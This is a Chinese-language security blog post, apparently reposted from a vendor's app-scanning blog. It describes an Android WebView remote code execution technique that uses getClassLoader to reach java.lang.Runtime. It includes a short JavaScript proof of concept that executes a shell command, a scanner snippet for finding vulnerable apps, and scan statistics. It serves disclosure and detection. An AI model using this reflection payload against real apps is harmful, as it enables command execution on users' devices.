---
layout: post
title:  "Android Webview 远程代码执行之getClassLoader"
date:   2016-12-07 23:43:16
categories: Android
excerpt: Android create page
---

* content
{:toc}

- 漏洞分析

众所周知，在Android 4.4系统上 Google已经将系统默认的Webkit内核替换成自己的开源项目chromium,并在Issue 213693005（https://codereview.chromium.org/213693005）屏蔽 了webview的object.getClass，android在4.4.4版本上彻底从native层禁止了webview对getClass的调用，从而阻断了一条反射执行命令的道路。但是Context的getClassLoader().loadClass(“java.lang.Runtime”)却是没有被禁止的。

 

## 0x1 漏洞原理

同样是webview远程代码执行，原理也是通过反射的方法调用“java.lang.Runtime”来执行命令。不过不能使用getClass，但是可以使用getClassLoader，代码如下：

 

示例代码

```
var loader = window.local_obj.getClassLoader();

var runtimeClass = loader.loadClass("java.lang.Runtime");

var p=runtimeClass.getMethod("getRuntime",null).invoke(null,null).exec(["ls","/etc/hosts","-l"]);
```

 

## 0x2 漏洞限制

addJavascriptInterface绑定的对象必须为context的子类（一般都是activity），因为这样才能调用getClassLoader。

targetSDKversion <17，只有在targetsdk小于17的时候才能调用js对象的任意方法，targetsdk>=17的情况下只能调用加了@JavaScriptInterface注解的方法。

 

## 0x3 扫描方法

通过分析整个反编译后的smali文件，搜索addJavascriptInterface方法，如果当前类的父类为Context的子类则判定为有漏洞：代码如下：

扫描代码

```java
if apkinfo['manifest_info'].is_internet:

        if int(apkinfo['manifest_info'].target_sdk) <= 16:

            rets = search_invokes("Landroid/webkit/WebView;","addJavascriptInterface")

            ret_ = []

            if len(rets) == 0:

                r_rets.update({'risk':0,'result':[{'vul_id':vul_id,'md5':apkinfo['md5']}]})

                return r_rets

            else:

                for r in rets:

                    r.update({'vul_id':vul_id})

                    r.update({'md5':apkinfo['md5']})

                    v_no = r['dst_params'].split(' ')[1][:-1]

                    if v_no == 'p0':

                        if get_superclass(r['src_class']) in target_superclass:

                            if r not in ret_:

                                ret_.append(r)
```

 

目前APPscan已支持对此新型webview远程代码执行的检测。

![](http://p6.yx-s.com/d/inn/871e8f8f/5.png)

## **0x4** **市场**影响

因为无视google对getClass的屏蔽，所以与android版本无关，只与targetSDK版本有关，在android4.4，5.0，5.1，6.0上均能实现远程代码执行。

![](http://p8.yx-s.com/d/inn/745d5a72/1.png)![](http://p6.yx-s.com/d/inn/9f485332/2.png)

通过对APPscan大数据中的13万 app以及手其他数据来源的8万app扫描，得出以下结果：

|                            | Appscan数据 | 其他来源  |
| -------------------------- | --------- | ----- |
| App总量                      | 133200    | 85574 |
| 符合条件（targetsdk<17，可上网，非加固） | 18087     | 38179 |
| 漏洞数量                       | 203       | 1144  |

![](http://p8.yx-s.com/d/inn/586e0ba3/3.png)       ![](http://p6.yx-s.com/d/inn/ea50d423/4.png)





来源：http://appscan.360.cn/blog/?p=25

